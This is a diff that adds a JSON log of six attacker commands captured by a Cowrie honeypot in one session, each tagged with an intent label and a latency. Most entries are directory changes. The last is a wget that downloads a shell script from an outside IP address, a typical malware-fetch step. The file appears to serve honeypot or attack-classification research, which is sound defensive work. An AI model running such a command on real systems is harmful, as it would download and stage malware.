@@ -1,0 +1,62 @@
+[
+  {
+    "index": 1,
+    "session_id": "5a14d21b",
+    "cmd": "cd /tmp",
+    "cowrie_output": "",
+    "latency_ms": 8074.9,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 2,
+    "session_id": "5a14d21b",
+    "cmd": "cd /var/run",
+    "cowrie_output": "",
+    "latency_ms": 8074.67,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 3,
+    "session_id": "5a14d21b",
+    "cmd": "cd /mnt",
+    "cowrie_output": "",
+    "latency_ms": 8074.12,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 4,
+    "session_id": "5a14d21b",
+    "cmd": "cd /root",
+    "cowrie_output": "CONNECTION_RESET",
+    "latency_ms": null,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 5,
+    "session_id": "5a14d21b",
+    "cmd": "cd /",
+    "cowrie_output": "",
+    "latency_ms": 8074.8,
+    "fi": 2,
+    "fi_label": "Modify/Navigate",
+    "skipped": false
+  },
+  {
+    "index": 6,
+    "session_id": "5a14d21b",
+    "cmd": "wget http://102.165.48.81/njs.sh",
+    "cowrie_output": "\u001b[4l--2026-04-18 10:28:21--  http://102.165.48.81/njs.sh\nConnecting to 102.165.48.81:80... connected.\nHTTP request sent, awaiting response...",
+    "latency_ms": 25076.92,
+    "fi": 1,
+    "fi_label": "Create/Install",
+    "skipped": false
+  }
+]
